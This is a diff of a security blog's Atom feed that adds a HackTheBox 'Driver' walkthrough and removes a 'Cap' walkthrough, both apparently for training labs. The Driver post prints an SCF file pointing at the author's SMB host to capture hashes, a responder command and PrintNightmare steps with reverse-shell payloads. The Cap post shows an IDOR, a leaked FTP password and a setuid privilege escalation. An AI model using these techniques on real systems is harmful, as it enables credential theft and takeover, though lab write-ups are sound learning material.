@@ -1,4 +1,148 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-02-19T18:00:33+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Bolt - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/bolt.html" rel="alternate" type="text/html" title="Bolt - HackTheBox" /><published>2022-02-19T00:00:00+01:00</published><updated>2022-02-19T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/bolt</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/bolt.html"><![CDATA[<p><strong>Bolt</strong> is a very interesting <em>medium</em> linux box featuring some heavy enumeration. For foothold, you exploit a web page that’s vulnerable to <strong>SSTI</strong>. After some enumeration, you will find a MySQL credential in a configuration file, which will give you access to a local user. For privilege escalation, you will take advantage of a <em>chrome</em> extension that dumps GPG keys into it’s logs on disk.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-02-26T10:36:17+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Driver - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/driver.html" rel="alternate" type="text/html" title="Driver - HackTheBox" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/driver</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/driver.html"><![CDATA[<p><strong>Driver</strong> is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an <em>SCF File Attack</em> to capture and crack the password of a local user using <code class="language-plaintext highlighter-rouge">responder</code>. After cracking the hash, you can exploit the <em>Print Nightmare</em> vulnerability to gain a privileged access to the box.</p>
+
+<h3 id="about">About</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/20211005084532.png" alt="" /></p>
+
+<p><img src="/assets/img/20211005084600.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+
+<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct  5 08:48:12 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.106
+Nmap scan report for 10.10.11.106
+Host is up (0.28s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+135/tcp open  msrpc        Microsoft Windows RPC
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-10-05 16:03:00
+|_  start_date: 2021-10-05 12:34:03
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct  5 08:49:26 2021 -- 1 IP address (1 host up) scanned in 74.97 seconds
+
+</code></pre>
+
+<p>Complete port scan showed <em>winrm</em> on port <strong>5985</strong>;</p>
+
+<p><img src="/assets/img/20211005095636.png" alt="" /></p>
+
+<h4 id="web">Web</h4>
+
+<p><img src="/assets/img/20211005085101.png" alt="" /></p>
+
+<p><img src="/assets/img/20211005085120.png" alt="" /></p>
+
+<p>Login attempt using the credentials of <code class="language-plaintext highlighter-rouge">admin:admin</code> granted access;</p>
+
+<p><img src="/assets/img/20211005085453.png" alt="" /></p>
+
+<p>All the links in the navigation are dead, except one that allows for driver upload for firmware update;</p>
+
+<p><img src="/assets/img/20211005091114.png" alt="" /></p>
+
+<p>Request generated by file upload;</p>
+
+<p><img src="/assets/img/20211005092123.png" alt="" /></p>
+
+<p>On successful file upload;</p>
+
+<p><img src="/assets/img/20211005092218.png" alt="" /></p>
+
+<p>Use of the creds to access SMB failed, <code class="language-plaintext highlighter-rouge">rpcclient</code> null auth also failed;</p>
+
+<p><img src="/assets/img/20211005090833.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">CrackMapExec</code> also showed it’s not a valid SMB cred;</p>
+
+<p><img src="/assets/img/20211005095946.png" alt="" /></p>
+
+<p>Googling the title of the firmware update page kept linking me to the <em>PrintNightmare</em> vulnerabiity, but I was unable to exploit as I don’t have access to the SMB service.</p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="foothold">Foothold</h3>
+<p><br /></p>
+
+<p>After a lot of googling as I am not very familiar with windows, I was introduced to SCF File Attacks. This attack can be exploited to capture SMB credentials by making authenticated users try to access an SMB service in an attackers control. I crafted a simple SCF file with the contents;</p>
+
+<pre><code class="language-raw">[Shell]
+Command=2
+IconFile=\\10.10.14.95\Badshare\file.txt
+
+[Taskbar]
+command=ToggleDesktop
+</code></pre>
+
+<p>Note that <code class="language-plaintext highlighter-rouge">IconFile</code> points to an SMB service running on my attack host. I used the upload form in the website and uploaded it as <code class="language-plaintext highlighter-rouge">@exploit.scf</code>. The <code class="language-plaintext highlighter-rouge">@</code> symbol will move the file to the top of the share driver, or so I read, and it will be executed the moment a user browses the share.</p>
+
+<p>With responder running on my attack host with the command <code class="language-plaintext highlighter-rouge">sudo responder -wrf --lm -v -I tun0</code>, I was able to capture the hash of a user named <strong>tony</strong>;</p>
+
+<p><img src="/assets/img/20211027122030.png" alt="" /></p>
+
+<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no problems cracking it;</p>
+
+<p><img src="/assets/img/20211027122209.png" alt="" /></p>
+
+<p>With the hash cracked, I had all I need to run <em>PrintNightmare</em>. I setup an SMB share with the name <em>Test</em> in a temporary directory on my attack host using Samba, and enabled anonymous logins. I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate the DLL payload required by the exploit, and moved it into the root directory of the SMB share. The exploit ran through all it’s three (3) stages, but I couldn’t get a connection back. Running <code class="language-plaintext highlighter-rouge">inotifywait -e CLOSE meterpreter.dll</code> showed that the DLL was read when running the exploit.</p>
+
+<p>The payload I initially used was <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code>, so I changed it to <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code>;</p>
+
+<p><img src="/assets/img/20211027171430.png" alt="" /></p>
+
+<p>Running the exploit again, I got a high privilege shell on the box, sparing me the need for any sort of privesc;</p>
+
+<p><img src="/assets/img/20211027171557.png" alt="" /></p>
+
+<p><img src="/assets/img/20211027171647.png" alt="" /></p>
+
+<p><img src="/assets/img/20211027171750.png" alt="" /></p>
+
+<p>I found the user flag inside <code class="language-plaintext highlighter-rouge">C:\Users\tony\Desktop</code>, and the root flag in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code>.</p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>Identified running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
+  <li>Got a login form on the website, which accept the credential <code class="language-plaintext highlighter-rouge">admin:admin</code></li>
+  <li>Found a firmware update page in the admin panel that allows for file upload.</li>
+  <li>Performed an SCF File Attack to capture the SMB hash of a user named <strong>tony</strong> using <code class="language-plaintext highlighter-rouge">responder</code>, and cracked it using <code class="language-plaintext highlighter-rouge">john</code>.</li>
+  <li>Ran a <em>PrintNightmare</em> exploit on the target to gain a privileged access on the box.</li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="windows" /><category term="smb" /><category term="scf file attack" /><category term="print nightmare" /><category term="responder" /><category term="metasploit" /><category term="msfvenom" /><summary type="html"><![CDATA[Driver is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an SCF File Attack to capture and crack the password of a local user using responder. After cracking the hash, you can exploit the Print Nightmare vulnerability to gain a privileged access to the box.]]></summary></entry><entry><title type="html">Bolt - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/bolt.html" rel="alternate" type="text/html" title="Bolt - HackTheBox" /><published>2022-02-19T00:00:00+01:00</published><updated>2022-02-19T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/bolt</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/bolt.html"><![CDATA[<p><strong>Bolt</strong> is a very interesting <em>medium</em> linux box featuring some heavy enumeration. For foothold, you exploit a web page that’s vulnerable to <strong>SSTI</strong>. After some enumeration, you will find a MySQL credential in a configuration file, which will give you access to a local user. For privilege escalation, you will take advantage of a <em>chrome</em> extension that dumps GPG keys into it’s logs on disk.</p>
 
 <p><br /></p>
 
@@ -2439,122 +2583,4 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p><img src="/assets/img/2021-11-07_09-06_1.png" alt="" /></p>
 
-<p><img src="/assets/img/2021-11-07_09-06.png" alt="" /></p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf" /><category term="synack red team" /><category term="hackthebox" /><category term="jeopardy" /><category term="template injection" /><category term="sql injection" /><category term="command injection" /><category term="rsa" /><category term="pwn" /><category term="traffic analysis" /><category term="static analysis" /><category term="reversing" /><summary type="html"><![CDATA[Synack Red Team 5 CTF was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics, misc, and reversing). I managed to solve 16 out of the 25 total challenges, solving at least one challenge in each category. My strongest category was web, in which I solved 5 out of 6 challenges. I eventually finished 46th out of 333 participants, which was narrowly within my target of top 50, and for that I am happy :)]]></summary></entry><entry><title type="html">Cap - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/cap.html" rel="alternate" type="text/html" title="Cap - HackTheBox" /><published>2021-10-30T00:00:00+01:00</published><updated>2021-10-30T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/cap</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/cap.html"><![CDATA[<p><strong>Cap</strong> is a very easy linux box. It has a web service that allows you to view network interfaces as the output of <code class="language-plaintext highlighter-rouge">ifconfig</code>, and the ability to briefly capture packets for 5 seconds (and download the <code class="language-plaintext highlighter-rouge">.pcap</code> file to your own machine). The URL to download the PCAP file contains a numeric ID, and was found to be vulnerable to an <em>IDOR</em> vulnerability, which I exploited to enumerate previously capture PCAPs, one of which contains a credential for an FTP service, which gave me access to the box over SSH. Once in, I analysed the source code of the web application, and found that it’s performing privileged operations (capturing traffic) without explicitly elevating privileges. The script does not have <em>SUID</em> permissions, which indicate the python interpreter may actually be running as <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p><br /></p>
-
-<h3 id="info">Info</h3>
-<p><br /></p>
-
-<ul>
-  <li><em>OS</em> - Linux</li>
-  <li><em>Difficulty</em> - Easy</li>
-  <li><em>Points</em> - 20</li>
-  <li><em>Release</em> - 05/Jun/2021</li>
-  <li><em>IP</em> - 10.10.10.245</li>
-</ul>
-
-<p><br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<p><img src="/assets/img/20210927164226.png" alt="" /></p>
-
-<h4 id="wappalyzer">Wappalyzer</h4>
-
-<p><img src="/assets/img/20210608113700.png" alt="" /></p>
-
-<p>The web app provide an option for downloading pcap files. The path in the menu is <code class="language-plaintext highlighter-rouge">/data/8</code>, which contains only one packet. Bruteforcing the number in the URL revealed that <code class="language-plaintext highlighter-rouge">/data/6</code> contains <strong>16</strong> packets.</p>
-
-<p><img src="/assets/img/20210608115015.png" alt="" /></p>
-
-<p>In the navigation menu, there is a <em>Network status</em> option that showed some <code class="language-plaintext highlighter-rouge">netstat</code> output, and seemed to be running on the host. It also revealed a possible user named <strong>Nathan</strong>;</p>
-
-<p><img src="/assets/img/20210927163913.png" alt="" /></p>
-
-<p>Searching Expoit DB using <code class="language-plaintext highlighter-rouge">searchsploit</code> indicate the <em>vsftpd</em> service running on the host is vulnerable to a <em>DoS</em> attack. This isn’t something I’m interested in doing.</p>
-
-<p><img src="/assets/img/20210927164515.png" alt="" />
-<img src="/assets/img/20210927164640.png" alt="" />
-<br /></p>
-
-<h4 id="python-gunicorn-web-server">Python GUNICORN Web Server</h4>
-
-<p><img src="/assets/img/20210927165406.png" alt="" /></p>
-
-<p><img src="/assets/img/20210927165340.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="foothold">Foothold</h3>
-<p><br /></p>
-
-<p>The below URL provide a PCAP for download. On analysis, the capture packets showed many HTTP packets exchanged between my attack host and the target box. This makes sense since at the time of the download, I was using <strong>ffuf</strong> in the background to bruteforce hidden files on the web root. The PCAPs were generated after making a request to <code class="language-plaintext highlighter-rouge">/capture</code>.</p>
-
-<p><img src="/assets/img/20210927165715.png" alt="" /></p>
-
-<p><img src="/assets/img/20210927170123.png" alt="" /></p>
-
-<p>Through testing, it was found that the packet capture is initiated when the <code class="language-plaintext highlighter-rouge">/capture</code> path was requested, and captures packets for 5 seconds. Making the capture request while pinging the host showed some ICMP packets in the PCAP file;</p>
-
-<p><img src="/assets/img/20210927171122.png" alt="" /></p>
-
-<p>The exploit code provided in Exploit DB for the DoS is quite messy and creates a lot of processes that just refuse to die even after I terminated the main process;</p>
-
-<p><img src="/assets/img/20210927173128.png" alt="" /></p>
-
-<p>The packets captured during the DoS attack indicate the FTP server <strong>rejecting connections</strong> from our host due to too many connections made;</p>
-
-<p><img src="/assets/img/20210927174401.png" alt="" /></p>
-
-<p>This indicate my approach of DoSing out a connected user in hope of capturing authentication packets during reconnection probably won’t work.</p>
-
-<p>Every time a request was made to <code class="language-plaintext highlighter-rouge">/capture</code>, the web app hangs for 5 seconds (to capture the packets I guess?) and redirect user to <code class="language-plaintext highlighter-rouge">/data/&lt;n&gt;</code> (where <code class="language-plaintext highlighter-rouge">&lt;n&gt;</code> is a number) to download the captured PCAP. So I decided to bruteforce the number in hope of finding other PCAPs, and the first one yielded an FTP credential <code class="language-plaintext highlighter-rouge">nathan:Buck3tH4TF0RM3!</code>;</p>
-
-<p><img src="/assets/img/20210927180517.png" alt="" /></p>
-
-<p><img src="/assets/img/20210927175931.png" alt="" /></p>
-
-<p>Using the credential, I was able to access the box via SSH and obtain user flag;</p>
-
-<p><img src="/assets/img/20210927180753.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p>The <strong>nathan</strong> user is not allowed sudo access.</p>
-
-<p><code class="language-plaintext highlighter-rouge">linPEAS</code> doesn’t yield anything interesting. However, reading the source code of the python web app revelealed an interesting block of code I can probably exploit. It contains the code that captures the packets using <code class="language-plaintext highlighter-rouge">tcpdump</code>;</p>
-
-<p><img src="/assets/img/20210927183511.png" alt="" /></p>
-
-<p>My first attempt to inject code into the <code class="language-plaintext highlighter-rouge">app.py</code> file above does not work for some reasons.
-Looking at the code file permissions, I noticed it those not have any special permissions, but manages to execute <code class="language-plaintext highlighter-rouge">tcpdump</code> and capture packets, which is clearly a privileged operation. The call to <code class="language-plaintext highlighter-rouge">python3</code> highlighted above is also direct with no special permissions, which indicate privileges are acquired by the call to <code class="language-plaintext highlighter-rouge">os.setuid(0)</code>. So I opened a python3 shell as <code class="language-plaintext highlighter-rouge">nathan</code>, and execute the <code class="language-plaintext highlighter-rouge">os.setuid(0)</code> command, which gave me root privileges that I used to spawn a bash shell;</p>
-
-<p><img src="/assets/img/20210927185821.png" alt="" />
-<br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Identified running services with <em>NMAP</em>, and web technologies with <em>Wappalyzer</em>.</li>
-  <li>Found an option on the web app for starting a 5 second packet capture, and downloading the <em>PCAP</em> file generated.</li>
-  <li>Found a <em>DoS</em> exploit for <em>VSFPD</em> service running on the host.</li>
-  <li>Mistook an established SSH connection shown in the <em>Network Status</em> menu as a connected FTP session. Got the idea to use the DoS exploit in the hope that the client will be disconnected, and authentication traffic captured during reconnection. It failed horribly, with the FTP server rejecting connections from my IP.</li>
-  <li>Discovered a PCAP file with captured FTP authentication traffic by bruteforcing the numeric identifier in the PCAP download URL. The PCAP contains FTP login credentials for a user named <code class="language-plaintext highlighter-rouge">nathan</code>, which gave me access to the system via SSH.</li>
-  <li>In  the system as the user <code class="language-plaintext highlighter-rouge">nathan</code> via SSH;
-    <ul>
-      <li>Found the source code file of the python3 script that performs the packet capture requested through the web application.</li>
-      <li>It uses <code class="language-plaintext highlighter-rouge">tcpdump</code> to capture packet after a call to <code class="language-plaintext highlighter-rouge">os.setuid(0)</code> to obtain privileges.</li>
-      <li>Launching the python CLI shell and calling the <code class="language-plaintext highlighter-rouge">os.setuid(0)</code> method granted me root privileges, indicating the python3 binary likely has SUID bit enabled.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="linux" /><category term="traffic analysis" /><category term="python" /><category term="custom exploitation" /><category term="idor" /><summary type="html"><![CDATA[Cap is a very easy linux box. It has a web service that allows you to view network interfaces as the output of ifconfig, and the ability to briefly capture packets for 5 seconds (and download the .pcap file to your own machine). The URL to download the PCAP file contains a numeric ID, and was found to be vulnerable to an IDOR vulnerability, which I exploited to enumerate previously capture PCAPs, one of which contains a credential for an FTP service, which gave me access to the box over SSH. Once in, I analysed the source code of the web application, and found that it’s performing privileged operations (capturing traffic) without explicitly elevating privileges. The script does not have SUID permissions, which indicate the python interpreter may actually be running as root.]]></summary></entry></feed>
+<p><img src="/assets/img/2021-11-07_09-06.png" alt="" /></p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf" /><category term="synack red team" /><category term="hackthebox" /><category term="jeopardy" /><category term="template injection" /><category term="sql injection" /><category term="command injection" /><category term="rsa" /><category term="pwn" /><category term="traffic analysis" /><category term="static analysis" /><category term="reversing" /><summary type="html"><![CDATA[Synack Red Team 5 CTF was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics, misc, and reversing). I managed to solve 16 out of the 25 total challenges, solving at least one challenge in each category. My strongest category was web, in which I solved 5 out of 6 challenges. I eventually finished 46th out of 333 participants, which was narrowly within my target of top 50, and for that I am happy :)]]></summary></entry></feed>
